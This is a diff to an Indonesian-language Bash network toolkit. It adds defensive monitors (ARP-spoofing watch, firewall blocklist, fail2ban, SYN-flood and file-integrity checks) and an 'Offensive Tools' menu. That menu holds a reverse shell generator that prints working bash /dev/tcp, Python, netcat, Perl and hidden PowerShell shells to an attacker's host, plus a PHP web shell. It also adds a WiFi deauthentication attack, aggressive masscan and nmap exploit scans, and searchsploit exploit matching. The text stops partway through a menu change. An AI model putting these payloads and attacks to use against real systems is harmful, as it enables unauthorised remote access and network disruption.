@@ -113,6 +113,7 @@ AI_TRAIN_FLAG=0
 AI_CHAT_FLAG=0
 SCENARIO_FLAG=0
 OLLAMA_FLAG=0
+OFFENSIVE_FLAG=0
 if [ -f "$MODE_FILE" ]; then
   source "$MODE_FILE"
   AI_DETECT_FLAG="${AI_DETECT:-0}"
@@ -120,6 +121,7 @@ if [ -f "$MODE_FILE" ]; then
   AI_CHAT_FLAG="${AI_CHAT:-0}"
   SCENARIO_FLAG="${SCENARIO:-0}"
   OLLAMA_FLAG="${OLLAMA:-0}"
+  OFFENSIVE_FLAG="${OFFENSIVE:-0}"
 fi
 AI_DETECT="$AI_DIR/ai_detect.py"
 AI_TRAIN="$AI_DIR/ai_train.py"
@@ -311,7 +313,7 @@ safe_bg() {
 # =========================
 # 🔄 UPDATE SYSTEM CONFIG
 # =========================
-CURRENT_VERSION="1.0.0"
+CURRENT_VERSION="2.0.0"
 
 REPO_URL="https://raw.githubusercontent.com/arjunaabdurrahman/kecembung/main"
 
@@ -883,6 +885,276 @@ cmd_reset_ip() {
   read -p "Tekan ENTER untuk kembali..."
 }
 
+cmd_arp_watch() {
+  clear
+  print_section "ARP WATCH - DETEKSI ARP SPOOFING"
+
+  print_info "Memantau ARP table... CTRL+C untuk berhenti"
+  echo ""
+
+  declare -A arp_table
+
+  while true; do
+    clear
+    print_section "ARP WATCH - LIVE MONITOR"
+    echo ""
+
+    while IFS= read -r line; do
+      ip=$(echo "$line" | grep -oP '(\d+\.){3}\d+')
+      mac=$(echo "$line" | grep -oP '([0-9a-f]{2}:){5}[0-9a-f]{2}')
+
+      [ -z "$ip" ] || [ -z "$mac" ] && continue
+
+      if [ -n "${arp_table[$ip]}" ] && [ "${arp_table[$ip]}" != "$mac" ]; then
+        echo -e "${RED}[⚠] ANOMALI DETECTED!${NC}"
+        echo -e "${RED}    IP    : $ip${NC}"
+        echo -e "${RED}    MAC lama : ${arp_table[$ip]}${NC}"
+        echo -e "${RED}    MAC baru : $mac${NC}"
+        echo "[$(date '+%F %T')] ANOMALI: $ip MAC berubah ${arp_table[$ip]} -> $mac" >> "$LOG_DIR/arp_watch.log"
+      else
+        echo -e "${GREEN}[✔]${NC} $ip  →  $mac"
+      fi
+
+      arp_table[$ip]="$mac"
+
+    done < <(ip neigh show 2>/dev/null)
+
+    echo ""
+    print_info "Refresh tiap 3 detik... CTRL+C untuk berhenti"
+    sleep 3
+  done
+}
+
+cmd_ip_blocklist() {
+  clear
+  print_section "IP BLOCKLIST - FIREWALL MANAGER"
+
+  echo "1. Block IP"
+  echo "2. Lihat IP yang diblock"
+  echo "3. Unblock IP"
+  echo "4. Kembali"
+  echo ""
+
+  read -p "Pilih: " opt
+
+  case $opt in
+    1)
+      read -p "IP yang mau diblock: " ip
+      if [ -z "$ip" ]; then
+        print_error "IP tidak boleh kosong"
+        return
+      fi
+      sudo iptables -A INPUT -s "$ip" -j DROP
+      sudo iptables -A OUTPUT -d "$ip" -j DROP
+      print_success "IP $ip berhasil diblock"
+      echo "[$(date '+%F %T')] BLOCK: $ip" >> "$LOG_DIR/blocklist.log"
+      ;;
+
+    2)
+      print_section "DAFTAR IP YANG DIBLOCK"
+      echo ""
+      sudo iptables -L INPUT -n --line-numbers | grep "DROP" | while read -r line; do
+        num=$(echo "$line" | awk '{print $1}')
+        ip=$(echo "$line" | awk '{print $4}')
+        packets=$(echo "$line" | awk '{print $NF}')
+        printf "%-5s %-20s\n" "$num" "$ip"
+      done
+      ;;
+
+    3)
+      read -p "IP yang mau di-unblock: " ip
+      if [ -z "$ip" ]; then
+        print_error "IP tidak boleh kosong"
+        return
+      fi
+      sudo iptables -D INPUT -s "$ip" -j DROP 2>/dev/null
+      sudo iptables -D OUTPUT -d "$ip" -j DROP 2>/dev/null
+      print_success "IP $ip berhasil di-unblock"
+      echo "[$(date '+%F %T')] UNBLOCK: $ip" >> "$LOG_DIR/blocklist.log"
+      ;;
+
+    4) return ;;
+  esac
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_conn_monitor() {
+  clear
+  print_section "CONNECTION MONITOR - LIVE TRAFFIC"
+
+  print_info "Memantau koneksi aktif... CTRL+C untuk berhenti"
+  echo ""
+
+  SUSPICIOUS_PORTS="4444 1337 31337 6666 6667 9999 8888"
+
+  while true; do
+    clear
+    print_section "ACTIVE CONNECTIONS"
+    echo ""
+
+    printf "%-10s %-25s %-25s %-15s %s\n" "PROTO" "LOCAL" "REMOTE" "STATUS" "PROGRAM"
+    echo "------------------------------------------------------------------------------------"
+
+    ss -tupn 2>/dev/null | tail -n +2 | while read -r line; do
+      proto=$(echo "$line" | awk '{print $1}')
+      local=$(echo "$line" | awk '{print $5}')
+      remote=$(echo "$line" | awk '{print $6}')
+      status=$(echo "$line" | awk '{print $2}')
+      prog=$(echo "$line" | awk '{print $NF}' | grep -oP 'users:\(\("\K[^"]+')
+
+      remote_port=$(echo "$remote" | grep -oP ':\K\d+$')
+
+      suspicious=0
+      for sp in $SUSPICIOUS_PORTS; do
+        [ "$remote_port" = "$sp" ] && suspicious=1
+      done
+
+      if [ "$suspicious" -eq 1 ]; then
+        echo -e "${RED}[⚠]${NC} $(printf "%-10s %-25s %-25s %-15s %s" "$proto" "$local" "$remote" "$status" "${prog:-unknown}")"
+        echo "[$(date '+%F %T')] SUSPICIOUS: $proto $local -> $remote $prog" >> "$LOG_DIR/conn_monitor.log"
+      else
+        printf "%-10s %-25s %-25s %-15s %s\n" "$proto" "$local" "$remote" "$status" "${prog:-unknown}"
+      fi
+    done
+
+    echo ""
+    print_info "Refresh tiap 2 detik... CTRL+C untuk berhenti"
+    sleep 2
+  done
+}
+
+cmd_dhcp_snooping() {
+  clear
+  print_section "DHCP SNOOPING - DETEKSI ROGUE DHCP"
+
+  if ! command -v nmap >/dev/null 2>&1; then
+    print_error "nmap belum terinstall"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  print_info "Scanning DHCP server di jaringan..."
+  print_info "Ini mungkin butuh beberapa detik..."
+  echo ""
+
+  result=$(sudo nmap --script broadcast-dhcp-discover -e "$(ip route | grep default | awk '{print $5}' | head -1)" 2>/dev/null)
+
+  server_count=$(echo "$result" | grep -c "Server Identifier")
+
+  echo -e "${CYAN}=============================${NC}"
+  echo -e "${CYAN}  HASIL DHCP SCAN${NC}"
+  echo -e "${CYAN}=============================${NC}"
+  echo ""
+
+  if [ "$server_count" -eq 0 ]; then
+    print_error "Tidak ada DHCP server terdeteksi"
+  elif [ "$server_count" -eq 1 ]; then
+    print_success "1 DHCP server ditemukan (normal)"
+    echo ""
+    echo "$result" | grep -E "Server Identifier|Router|Subnet|DNS" | while read -r line; do
+      echo "  $line"
+    done
+  else
+    echo -e "${RED}[⚠] PERINGATAN: $server_count DHCP server ditemukan!${NC}"
+    echo -e "${RED}    Kemungkinan ada ROGUE DHCP server di jaringan!${NC}"
+    echo ""
+    echo "$result" | grep -E "Server Identifier|Router|Subnet|DNS" | while read -r line; do
+      echo "  $line"
+    done
+    echo "[$(date '+%F %T')] ROGUE DHCP DETECTED: $server_count servers" >> "$LOG_DIR/dhcp_snoop.log"
+  fi
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_mac_whitelist() {
+  clear
+  print_section "MAC WHITELIST - KONTROL AKSES DEVICE"
+
+  WHITELIST_FILE="$LOG_DIR/mac_whitelist.txt"
+  touch "$WHITELIST_FILE"
+
+  echo "1. Lihat whitelist"
+  echo "2. Tambah MAC ke whitelist"
+  echo "3. Hapus MAC dari whitelist"
+  echo "4. Scan & bandingkan dengan jaringan"
+  echo "5. Kembali"
+  echo ""
+
+  read -p "Pilih: " opt
+
+  case $opt in
+    1)
+      echo ""
+      if [ ! -s "$WHITELIST_FILE" ]; then
+        print_info "Whitelist kosong"
+      else
+        echo -e "${CYAN}MAC Address yang diizinkan:${NC}"
+        echo ""
+        cat -n "$WHITELIST_FILE"
+      fi
+      ;;
+
+    2)
+      read -p "MAC Address (contoh: aa:bb:cc:dd:ee:ff): " mac
+      mac=$(echo "$mac" | tr '[:upper:]' '[:lower:]')
+      if [[ ! "$mac" =~ ^([0-9a-f]{2}:){5}[0-9a-f]{2}$ ]]; then
+        print_error "Format MAC tidak valid"
+        echo ""
+        read -p "Tekan ENTER untuk kembali..."
+        return
+      fi
+      if grep -qx "$mac" "$WHITELIST_FILE"; then
+        print_info "MAC sudah ada di whitelist"
+      else
+        echo "$mac" >> "$WHITELIST_FILE"
+        print_success "MAC $mac ditambahkan"
+      fi
+      ;;
+
+    3)
+      read -p "MAC Address yang mau dihapus: " mac
+      mac=$(echo "$mac" | tr '[:upper:]' '[:lower:]')
+      sed -i "/^$mac$/d" "$WHITELIST_FILE"
+      print_success "MAC $mac dihapus dari whitelist"
+      ;;
+
+    4)
+      echo ""
+      print_info "Scan device di jaringan..."
+      echo ""
+
+      printf "%-20s %-20s %s\n" "IP" "MAC" "STATUS"
+      echo "------------------------------------------------------------"
+
+      ip neigh show 2>/dev/null | while read -r line; do
+        ip=$(echo "$line" | awk '{print $1}')
+        mac=$(echo "$line" | awk '{print $5}' | tr '[:upper:]' '[:lower:]')
+
+        [ -z "$mac" ] || [ "$mac" = "FAILED" ] && continue
+
+        if grep -qx "$mac" "$WHITELIST_FILE"; then
+          printf "%-20s %-20s " "$ip" "$mac"
+          echo -e "${GREEN}[✔ TRUSTED]${NC}"
+        else
+          printf "%-20s %-20s " "$ip" "$mac"
+          echo -e "${RED}[⚠ UNKNOWN]${NC}"
+          echo "[$(date '+%F %T')] UNKNOWN MAC: $mac IP: $ip" >> "$LOG_DIR/mac_whitelist.log"
+        fi
+      done
+      ;;
+
+    5) return ;;
+  esac
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
 # =========================
 # COMMAND MAP - TCP TOOLS
 # =========================
@@ -985,6 +1257,224 @@ cmd_tcp_banner_grab() {
   echo ""
 
   nc -w 3 "$t" 80
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_port_knock_setup() {
+  clear
+  print_section "PORT KNOCKING - SEMBUNYIKAN PORT SSH"
+
+  echo "1. Install & setup knockd"
+  echo "2. Lihat konfigurasi aktif"
+  echo "3. Test knock sequence"
+  echo "4. Kembali"
+  echo ""
+
+  read -p "Pilih: " opt
+
+  case $opt in
+    1)
+      if ! command -v knockd >/dev/null 2>&1; then
+        print_info "Menginstall knockd..."
+        sudo apt install -y knockd >/dev/null 2>&1
+      fi
+
+      iface=$(ip route | grep default | awk '{print $5}' | head -1)
+
+      read -p "Port sequence (contoh: 7000,8000,9000): " sequence
+      sequence="${sequence:-7000,8000,9000}"
+
+      read -p "Port yang mau dibuka (default: 22): " target_port
+      target_port="${target_port:-22}"
+
+      read -p "Timeout detik (default: 10): " timeout
+      timeout="${timeout:-10}"
+
+      sudo tee /etc/knockd.conf > /dev/null <<EOF
+[options]
+    Interface = $iface
+    UseSyslog
+
+[openSSH]
+    sequence    = $sequence
+    seq_timeout = $timeout
+    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport $target_port -j ACCEPT
+    tcpflags    = syn
+
+[closeSSH]
+    sequence    = $(echo $sequence | tr ',' '\n' | tac | tr '\n' ',' | sed 's/,$//')
+    seq_timeout = $timeout
+    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport $target_port -j ACCEPT
+    tcpflags    = syn
+EOF
+
+      sudo systemctl enable knockd >/dev/null 2>&1
+      sudo systemctl restart knockd
+
+      echo ""
+      print_success "Port knocking aktif !"
+      echo ""
+      echo -e "${CYAN}Sequence untuk buka port $target_port:${NC}"
+      echo -e "${GREEN}  knock <server_ip> $sequence${NC}"
+      echo ""
+      echo -e "${CYAN}Sequence untuk tutup port $target_port:${NC}"
+      reverse=$(echo $sequence | tr ',' '\n' | tac | tr '\n' ',' | sed 's/,$//')
+      echo -e "${GREEN}  knock <server_ip> $reverse${NC}"
+      ;;
+
+    2)
+      if [ -f /etc/knockd.conf ]; then
+        echo ""
+        cat /etc/knockd.conf
+      else
+        print_error "knockd belum dikonfigurasi"
+      fi
+      ;;
+
+    3)
+      if ! command -v knock >/dev/null 2>&1; then
+        sudo apt install -y knockd >/dev/null 2>&1
+      fi
+      read -p "Server IP: " server
+      read -p "Sequence (contoh: 7000 8000 9000): " seq
+      knock "$server" $seq
+      print_success "Knock sequence dikirim ke $server"
+      ;;
+
+    4) return ;;
+  esac
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_fail2ban_status() {
+  clear
+  print_section "FAIL2BAN - ANTI BRUTE FORCE MONITOR"
+
+  if ! command -v fail2ban-client >/dev/null 2>&1; then
+    print_error "fail2ban belum terinstall"
+    echo ""
+    read -p "Install fail2ban? (Y/n): " ins
+    ins="${ins:-Y}"
+    if [ "$ins" = "Y" ] || [ "$ins" = "y" ]; then
+      sudo apt install -y fail2ban >/dev/null 2>&1
+      sudo systemctl enable fail2ban
+      sudo systemctl start fail2ban
+      print_success "fail2ban terinstall dan berjalan"
+    fi
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  echo "1. Status semua jail"
+  echo "2. Detail jail SSH"
+  echo "3. Lihat IP yang diban"
+  echo "4. Unban IP"
+  echo "5. Kembali"
+  echo ""
+
+  read -p "Pilih: " opt
+
+  case $opt in
+    1)
+      echo ""
+      print_section "STATUS JAIL"
+      sudo fail2ban-client status 2>/dev/null
+      ;;
+
+    2)
+      echo ""
+      print_section "DETAIL SSH JAIL"
+      sudo fail2ban-client status sshd 2>/dev/null || \
+      sudo fail2ban-client status ssh 2>/dev/null || \
+      print_error "SSH jail tidak aktif"
+      ;;
+
+    3)
+      echo ""
+      print_section "BANNED IP LIST"
+      echo ""
+      sudo fail2ban-client status sshd 2>/dev/null | grep "Banned IP" | while read -r line; do
+        ips=$(echo "$line" | cut -d: -f2)
+        for ip in $ips; do
+          echo -e "  ${RED}[BANNED]${NC} $ip"
+        done
+      done
+      ;;
+
+    4)
+      read -p "IP yang mau di-unban: " ip
+      sudo fail2ban-client set sshd unbanip "$ip" 2>/dev/null || \
+      sudo fail2ban-client set ssh unbanip "$ip" 2>/dev/null
+      print_success "IP $ip di-unban"
+      ;;
+
+    5) return ;;
+  esac
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_syn_flood_detect() {
+  clear
+  print_section "SYN FLOOD DETECTOR - ANTI DDOS"
+
+  print_info "Menganalisa koneksi SYN_RECV..."
+  echo ""
+
+  syn_count=$(ss -ant 2>/dev/null | grep -c "SYN-RECV")
+  syncookies=$(cat /proc/sys/net/ipv4/tcp_syncookies 2>/dev/null)
+
+  echo -e "${CYAN}=============================${NC}"
+  echo -e "${CYAN}  HASIL ANALISA${NC}"
+  echo -e "${CYAN}=============================${NC}"
+  echo ""
+
+  print_keyval "SYN_RECV total" "$syn_count koneksi"
+
+  if [ "$syncookies" = "1" ]; then
+    print_keyval "SYN Cookies" "$(echo -e "${GREEN}AKTIF${NC} (terlindungi)")"
+  else
+    print_keyval "SYN Cookies" "$(echo -e "${RED}TIDAK AKTIF${NC} (rentan!)")"
+  fi
+
+  echo ""
+
+  if [ "$syn_count" -gt 100 ]; then
+    echo -e "${RED}[⚠] PERINGATAN: SYN FLOOD TERDETEKSI!${NC}"
+    echo -e "${RED}    $syn_count koneksi SYN_RECV aktif${NC}"
+    echo ""
+    echo "Top IP penyerang:"
+    echo ""
+    ss -ant 2>/dev/null | grep "SYN-RECV" | awk '{print $5}' | \
+      cut -d: -f1 | sort | uniq -c | sort -rn | head -10 | \
+      while read -r count ip; do
+        printf "  ${RED}%-20s${NC} %s attempts\n" "$ip" "$count"
+      done
+    echo "[$(date '+%F %T')] SYN FLOOD: $syn_count SYN_RECV" >> "$LOG_DIR/syn_flood.log"
+  elif [ "$syn_count" -gt 50 ]; then
+    echo -e "${YELLOW}[!] WASPADA: $syn_count SYN_RECV (mulai tinggi)${NC}"
+  else
+    print_success "Kondisi normal ($syn_count SYN_RECV)"
+  fi
+
+  echo ""
+
+  if [ "$syncookies" != "1" ]; then
+    echo -e "${YELLOW}Aktifkan SYN Cookies untuk perlindungan? (Y/n): ${NC}"
+    read -r ans
+    ans="${ans:-Y}"
+    if [ "$ans" = "Y" ] || [ "$ans" = "y" ]; then
+      sudo sysctl -w net.ipv4.tcp_syncookies=1 >/dev/null
+      echo "net.ipv4.tcp_syncookies=1" | sudo tee -a /etc/sysctl.conf >/dev/null
+      print_success "SYN Cookies diaktifkan"
+    fi
+  fi
 
   echo ""
   read -p "Tekan ENTER untuk kembali..."
@@ -1101,6 +1591,174 @@ cmd_storage_save_log() {
 
   echo ""
   read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_log_integrity_check() {
+  clear
+  print_section "LOG INTEGRITY CHECK - DETEKSI TAMPERING"
+
+  HASH_FILE="$LOG_DIR/log_hashes.txt"
+  LOG_TARGETS="/var/log/auth.log /var/log/syslog /var/log/kern.log /var/log/dpkg.log"
+
+  echo "1. Simpan hash log sekarang (baseline)"
+  echo "2. Cek integritas log"
+  echo "3. Lihat history check"
+  echo "4. Kembali"
+  echo ""
+
+  read -p "Pilih: " opt
+
+  case $opt in
+    1)
+      echo ""
+      print_info "Menyimpan hash baseline..."
+      echo ""
+      > "$HASH_FILE.new"
+      for log in $LOG_TARGETS; do
+        if [ -f "$log" ]; then
+          hash=$(sha256sum "$log" | awk '{print $1}')
+          echo "$log:$hash:$(date +%s)" >> "$HASH_FILE.new"
+          print_success "$(basename "$log") → $hash"
+        else
+          print_error "$log tidak ditemukan"
+        fi
+      done
+      mv "$HASH_FILE.new" "$HASH_FILE"
+      print_success "Baseline disimpan"
+      ;;
+
+    2)
+      echo ""
+      if [ ! -f "$HASH_FILE" ]; then
+        print_error "Belum ada baseline. Jalankan opsi 1 dulu."
+        echo ""
+        read -p "Tekan ENTER untuk kembali..."
+        return
+      fi
+
+      print_info "Mengecek integritas log..."
+      echo ""
+
+      printf "%-30s %s\n" "FILE" "STATUS"
+      echo "--------------------------------------------"
+
+      while IFS=: read -r logfile stored_hash timestamp; do
+        if [ ! -f "$logfile" ]; then
+          printf "%-30s " "$(basename "$logfile")"
+          echo -e "${RED}[FILE HILANG!]${NC}"
+          echo "[$(date '+%F %T')] MISSING: $logfile" >> "$LOG_DIR/integrity.log"
+          continue
+        fi
+
+        current_hash=$(sha256sum "$logfile" | awk '{print $1}')
+
+        printf "%-30s " "$(basename "$logfile")"
+
+        if [ "$current_hash" = "$stored_hash" ]; then
+          echo -e "${GREEN}[✔ CLEAN]${NC}"
+        else
+          echo -e "${RED}[⚠ TAMPERED!]${NC}"
+          echo "[$(date '+%F %T')] TAMPERED: $logfile" >> "$LOG_DIR/integrity.log"
+        fi
+
+      done < "$HASH_FILE"
+      ;;
+
+    3)
+      echo ""
+      if [ -f "$LOG_DIR/integrity.log" ]; then
+        cat "$LOG_DIR/integrity.log"
+      else
+        print_info "Belum ada history check"
+      fi
+      ;;
+
+    4) return ;;
+  esac
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_file_monitor() {
+  clear
+  print_section "FILE MONITOR - REAL TIME WATCHER"
+
+  if ! command -v inotifywait >/dev/null 2>&1; then
+    print_error "inotify-tools belum terinstall"
+    echo ""
+    read -p "Install sekarang? (Y/n): " ins
+    ins="${ins:-Y}"
+    if [ "$ins" = "Y" ] || [ "$ins" = "y" ]; then
+      sudo apt install -y inotify-tools >/dev/null 2>&1
+      print_success "inotify-tools terinstall"
+    else
+      echo ""
+      read -p "Tekan ENTER untuk kembali..."
+      return
+    fi
+  fi
+
+  echo "Path yang mau dimonitor:"
+  echo "1. /etc (sistem config)"
+  echo "2. /var/www (web server)"
+  echo "3. /home (user files)"
+  echo "4. Custom path"
+  echo ""
+
+  read -p "Pilih: " pathopt
+
+  case $pathopt in
+    1) watch_path="/etc" ;;
+    2) watch_path="/var/www" ;;
+    3) watch_path="/home" ;;
+    4)
+      read -p "Path: " watch_path
+      if [ ! -d "$watch_path" ] && [ ! -f "$watch_path" ]; then
+        print_error "Path tidak ditemukan"
+        echo ""
+        read -p "Tekan ENTER untuk kembali..."
+        return
+      fi
+      ;;
+    *) watch_path="/etc" ;;
+  esac
+
+  echo ""
+  print_info "Memantau: $watch_path"
+  print_info "CTRL+C untuk berhenti"
+  echo ""
+  printf "%-20s %-12s %s\n" "WAKTU" "EVENT" "FILE"
+  echo "------------------------------------------------------------"
+
+  inotifywait -m -r "$watch_path" \
+    -e create -e modify -e delete -e moved_to -e moved_from \
+    --format '%T %e %w%f' \
+    --timefmt '%H:%M:%S' 2>/dev/null | while read -r time event file; do
+
+    case $event in
+      CREATE|MOVED_TO)
+        color="$YELLOW"
+        ;;
+      DELETE|MOVED_FROM)
+        color="$RED"
+        ;;
+      MODIFY)
+        color="$CYAN"
+        ;;
+      *)
+        color="$NC"
+        ;;
+    esac
+
+    printf "%-20s " "$time"
+    echo -ne "${color}"
+    printf "%-12s " "$event"
+    echo -e "${NC}$file"
+
+    echo "[$(date '+%F %T')] $event: $file" >> "$LOG_DIR/file_monitor.log"
+
+  done
 }
 
 # =========================
@@ -1888,6 +2546,207 @@ run_scenario_file() {
 }
 
 # =========================
+# OFFENSIVE - OFFENSIVE TOOLS
+# =========================
+
+cmd_nmap_vuln_scan() {
+  clear
+  print_section "NMAP VULN SCAN - CVE HUNTER"
+
+  if ! command -v nmap >/dev/null 2>&1; then
+    print_error "nmap belum terinstall"
+    return
+  fi
+
+  read -p "Target IP/Domain: " target
+  [ -z "$target" ] && { print_error "Target kosong"; return; }
+
+  init_storage
+  mkdir -p "$storage_path/offensive"
+  out_file="$storage_path/offensive/nmap_vuln_$(date +%F_%H-%M).txt"
+
+  print_keyval "Target" "$target"
+  print_info "Scanning CVE + vuln scripts... bisa 5-10 menit"
+  echo ""
+
+  nmap -sV --script vuln,exploit,auth -Pn "$target" | tee "$out_file"
+
+  print_success "Hasil disimpan: $out_file"
+  log_save "OFFENSIVE: Nmap Vuln Scan $target"
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_masscan_aggressive() {
+  clear
+  print_section "MASSCAN - AGGRESSIVE PORT BLAST"
+
+  if ! command -v masscan >/dev/null 2>&1; then
+    print_error "masscan belum install. apt install masscan"
+    return
+  fi
+
+  read -p "Target IP/Subnet: " target
+  read -p "Rate paket/detik [10000]: " rate
+  rate=${rate:-10000}
+
+  [ -z "$target" ] && { print_error "Target kosong"; return; }
+
+  init_storage
+  mkdir -p "$storage_path/offensive"
+  out_file="$storage_path/offensive/masscan_$(date +%F_%H-%M).txt"
+
+  print_keyval "Target" "$target"
+  print_keyval "Rate" "$rate pps"
+  print_keyval "Ports" "0-65535"
+  print_info "Scanning... CTRL+C untuk stop"
+  echo ""
+
+  sudo masscan -p0-65535 "$target" --rate="$rate" | tee "$out_file"
+
+  print_success "Hasil: $out_file"
+  log_save "OFFENSIVE: Masscan $target"
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_reverse_shell_gen() {
+  clear
+  print_section "REVERSE SHELL GENERATOR"
+
+  echo "1. Bash"
+  echo "2. Python"
+  echo "3. PHP"
+  echo "4. Netcat"
+  echo "5. Perl"
+  echo "6. PowerShell"
+  echo "7. Kembali"
+  echo ""
+  read -p "Pilih jenis shell: " jenis
+
+  [ "$jenis" = "7" ] && return
+
+  read -p "LHOST (IP kamu): " lhost
+  read -p "LPORT (port kamu): " lport
+
+  [ -z "$lhost" ] || [ -z "$lport" ] && { print_error "LHOST/LPORT kosong"; return; }
+
+  echo ""
+  print_section "PAYLOAD"
+  echo ""
+
+  case $jenis in
+    1) echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" ;;
+    2) echo "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" ;;
+    3) echo "<?php system(\$_GET['cmd']);?>"
+       echo "# Upload ini, akses: http://target/shell.php?cmd=nc%20$lhost%20$lport%20-e%20/bin/bash" ;;
+    4) echo "nc -e /bin/bash $lhost $lport" ;;
+    5) echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
+    6) echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$lhost\",$lport);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1 | Out-String );\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sbt=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sbt,0,\$sbt.Length);\$s.Flush()};\$c.Close()" ;;
+    *) print_error "Pilihan salah" ;;
+  esac
+
+  echo ""
+  print_section "LISTENER"
+  echo "nc -lvnp $lport"
+  echo ""
+
+  log_save "OFFENSIVE: Generate shell $lhost:$lport"
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_wifi_deauth_attack() {
+  clear
+  print_section "WIFI DEAUTH ATTACK"
+
+  if ! command -v aireplay-ng >/dev/null 2>&1; then
+    print_error "aircrack-ng belum install. apt install aircrack-ng"
+    return
+  fi
+
+  echo -e "${RED}[!] BUTUH INTERFACE MODE MONITOR${NC}"
+  echo ""
+  read -p "Interface : " iface
+  iface=${iface:-wlan0mon}
+
+  read -p "BSSID target (MAC AP): " bssid
+  [ -z "$bssid" ] && { print_error "BSSID kosong"; return; }
+
+  read -p "Target client MAC [kosong=all]: " client
+  read -p "Jumlah paket [0=infinite]: " count
+  count=${count:-0}
+
+  init_storage
+  mkdir -p "$storage_path/offensive"
+  log_file="$storage_path/offensive/deauth.log"
+
+  print_keyval "Interface" "$iface"
+  print_keyval "BSSID" "$bssid"
+  print_keyval "Client" "${client:-ALL}"
+  print_keyval "Count" "$count"
+  echo ""
+  print_error "Starting attack... CTRL+C to stop"
+  echo ""
+
+  if [ -z "$client" ]; then
+    aireplay-ng --deauth "$count" -a "$bssid" "$iface" | tee -a "$log_file"
+  else
+    aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$iface" | tee -a "$log_file"
+  fi
+
+  log_save "OFFENSIVE: Wifi Deauth $bssid"
+}
+
+cmd_exploit_autopwn() {
+  clear
+  print_section "EXPLOIT AUTOPWN - SEARCHSPLOIT"
+
+  if ! command -v searchsploit >/dev/null 2>&1; then
+    print_error "searchsploit belum install. apt install exploitdb"
+    return
+  fi
+
+  read -p "Target IP: " target
+  [ -z "$target" ] && { print_error "Target kosong"; return; }
+
+  init_storage
+  mkdir -p "$storage_path/offensive"
+  scan_file="$storage_path/offensive/nmap_sv_$target.txt"
+
+  print_info "Step 1: Scanning services..."
+  nmap -sV -Pn "$target" | tee "$scan_file"
+
+  echo ""
+  print_section "EXPLOIT MATCHING"
+  echo ""
+
+  grep -E "^[0-9]+/tcp" "$scan_file" | while read -r line; do
+    port=$(echo "$line" | awk '{print $1}' | cut -d/ -f1)
+    service=$(echo "$line" | awk '{print $3}')
+    version=$(echo "$line" | cut -d' ' -f4-)
+
+    [ -z "$version" ] && continue
+
+    print_keyval "Port $port" "$service $version"
+
+    result=$(searchsploit "$service $version" 2>/dev/null | grep -v "Exploits: No Results")
+
+    if [ -n "$result" ]; then
+      echo -e "${GREEN}[+] EXPLOIT FOUND:${NC}"
+      echo "$result" | head -5
+      echo ""
+    else
+      echo -e "${YELLOW}[-] No exploit${NC}"
+      echo ""
+    fi
+  done
+
+  log_save "OFFENSIVE: Exploit Autopwn $target"
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+# =========================
 # ⚙️ BACKGROUND INSTALL (SAFE)
 # =========================
 
@@ -1953,6 +2812,7 @@ while true; do
 
   [ "$HAS_AI"        -eq 1 ] && main_items+=("AI Tools")       && main_actions+=("menu_ai")
   [ "$SCENARIO_FLAG" -eq 1 ] && main_items+=("Custom Scenario") && main_actions+=("menu_scenario")
+  [ "$OFFENSIVE_FLAG" -eq 1 ] && main_items+=("Offensive Tools") && main_actions+=("menu_offensive")
 
   main_items+=("Exit"); main_actions+=("do_exit")
 
@@ -2007,35 +2867,93 @@ while true; do
         fi
 
         echo -e "${CYAN}=========================${NC}"
-        echo -e "${GREEN}        IP TOOLS${NC}"
-        echo -e "${CYAN}=========================${NC}"
-        echo "1. Lihat IP"
-        echo "2. Scan Jaringan"
-        echo "3. Ping IP"
-        echo "4. Set IP Manual"
-        echo "5. Routing"
-        echo "6. DNS Check"
-        echo "7. Internet Check"
-        echo "8. Scan SSH Device"
-        echo "9. SSH Connect"
-        echo "10. Reset IP"
-        echo "11. Kembali"
-        echo -e "${CYAN}=========================${NC}"
+	echo -e "${GREEN}        IP TOOLS${NC}"
+	echo -e "${CYAN}=========================${NC}"
+	echo "1. Network Utilities"
+	echo "2. Network Monitor"
+	echo "3. Network Control"
+	echo "4. Kembali"
+	echo -e "${CYAN}=========================${NC}"
 
         IFS= read -r -p "Pilih menu: " ipmenu || continue
 
         case $ipmenu in
-          1)  cmd_lihat_ip;      log_save "Lihat IP" ;;
-          2)  cmd_scan_jaringan; log_save "Scan jaringan" ;;
-          3)  cmd_ping_ip;       log_save "Ping IP" ;;
